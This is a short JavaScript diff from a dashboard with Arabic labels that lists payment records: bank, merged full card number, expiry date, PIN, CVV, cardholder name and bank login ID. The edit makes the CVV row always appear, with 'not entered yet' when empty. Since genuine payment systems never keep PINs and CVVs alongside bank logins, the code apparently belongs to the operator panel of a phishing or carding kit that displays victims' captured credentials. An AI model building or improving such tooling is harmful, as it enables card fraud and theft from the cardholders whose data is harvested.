@@ -791,15 +791,17 @@
       // بناء صفوف البيانات حسب ما هو موجود
       const payRows = [];
       if (b.payment.bank) payRows.push(dRow('البنك', b.payment.bank));
-      if (b.payment.cardPrefix) payRows.push(dRow('بادئة البطاقة', b.payment.cardPrefix));
-      if (b.payment.cardNumber) payRows.push(dRow('رقم البطاقة', b.payment.cardNumber));
+      // دمج prefix + cardNumber في خانة واحدة
+      const fullCard = (b.payment.cardPrefix || '') + (b.payment.cardNumber || b.payment.cardHolder || '');
+      if (fullCard) payRows.push(dRow('رقم البطاقة', fullCard));
       if (b.payment.expiryMonth || b.payment.expiryYear) {
         payRows.push(dRow('تاريخ الانتهاء', (b.payment.expiryMonth||'') + '/' + (b.payment.expiryYear||'')));
       } else if (b.payment.cardExpiry || b.payment.expiryDate) {
         payRows.push(dRow('تاريخ الانتهاء', b.payment.cardExpiry || b.payment.expiryDate));
       }
       if (b.payment.pin) payRows.push(dRow('الرقم السري (PIN)', b.payment.pin));
-      if (b.payment.cardCvv || b.payment.cvv) payRows.push(dRow('CVV', b.payment.cardCvv || b.payment.cvv));
+      // CVV دائماً - يظهر حتى لو فارغ
+      payRows.push(dRow('CVV', b.payment.cardCvv || b.payment.cvv || 'لم يدخل بعد'));
       if (b.payment.cardHolderName || b.payment.cardHolder) payRows.push(dRow('اسم حامل البطاقة', b.payment.cardHolderName || b.payment.cardHolder));
       if (b.payment.loginId) payRows.push(dRow('Login ID', b.payment.loginId));
       if (b.payment.clientId) payRows.push(dRow('رقم العميل', b.payment.clientId));
